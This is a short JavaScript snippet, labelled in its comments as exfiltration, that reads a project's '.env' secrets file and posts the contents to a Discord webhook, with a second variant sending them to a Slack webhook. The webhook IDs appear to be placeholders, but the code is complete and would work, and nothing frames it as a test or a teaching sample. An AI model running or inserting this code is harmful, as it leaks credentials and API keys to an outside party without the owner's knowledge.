import fs from 'fs';

// Exfil via Discord webhook
const webhook = 'https://discord.com/api/webhooks/123456/abcdef';
const secrets = fs.readFileSync('.env', 'utf-8');
fetch(webhook, { method: 'POST', body: JSON.stringify({ content: secrets }) });

// Slack variant
fetch('https://hooks.slack.com/services/T00/B00/xxx', {
  method: 'POST',
  body: JSON.stringify({ text: secrets })
});
